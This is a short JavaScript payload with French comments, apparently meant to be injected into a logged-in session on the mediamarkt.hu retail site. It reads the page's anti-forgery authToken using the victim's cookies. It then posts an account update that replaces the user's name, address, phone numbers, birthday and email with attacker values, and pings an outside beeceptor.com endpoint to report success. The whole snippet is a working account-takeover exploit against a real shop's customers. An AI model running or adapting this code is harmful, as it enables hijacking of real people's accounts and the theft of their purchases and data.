// Étape 1 : Récupérer le `authToken` depuis la page
fetch('https://www.mediamarkt.hu/webapp/wcs/stores/servlet/MultiChannelMAMasterData?storeId=19801&langId=-19', {
  method: 'GET',
  credentials: 'include'
})
  .then(response => response.text())
  .then(html => {
    // Extraire le `authToken` en analysant le HTML
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const authTokenElement = doc.querySelector('input[name="authToken"]');
    const authToken = authTokenElement ? authTokenElement.value : null;

    if (!authToken) {
      throw new Error('authToken introuvable dans la réponse.');
    }

    console.log(`authToken récupéré : ${authToken}`);

    // Étape 2 : Générer l'email dynamique
    let randomNumber = Math.floor(100000 + Math.random() * 900000);
    let email = `grabisch@mediamarktsaturn.com`;

    // Étape 3 : Envoyer la requête POST avec le `authToken`
    return fetch('https://www.mediamarkt.hu/webapp/wcs/stores/servlet/MultiChannelMAMasterDataUpdate', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `storeId=19801&langId=-19&addressType=billing&URL=https%3A%2F%2Fwww.mediamarkt.hu%2Fwebapp%2Fwcs%2Fstores%2Fservlet%2FMultiChannelMAMasterDataUpdate&demographicField4=0&isB2BAddress=false&authToken=${authToken}&personTitle=Mr&lastName=DOUM&firstName=DOUM&displayName=DOUM+D.&businessTitle=Andr%C3%A1ssy+%C3%BA&zipCode=1062&city=+Budapest&address1=+rue+des+doumbe&address3=22&streetType=k%C3%B6r%C3%BAt&address2=22+rue+des+doumbe&country=Franciaorsz%C3%A1g&phone2=%2B33782830011&phone1=%2B36782830897&birthdayYear=1999&birthdayMonth=10&birthdayDay=16&email1=${email}`
    });
  })
  .then(() => {
    // Étape 4 : Faire une autre requête GET pour confirmer
    let randomNumber = Math.floor(100000 + Math.random() * 900000);
    let email = `prozoihacoullu-9048%2b${randomNumber}@yopmail.com`;

    return fetch(`https://dindindin.free.beeceptor.com/mediamarkt/ok?NeWemail=${email}`, {
      method: 'GET',
    });
  })
  .catch(error => {
    console.error('Une erreur s\'est produite :', error);
  });
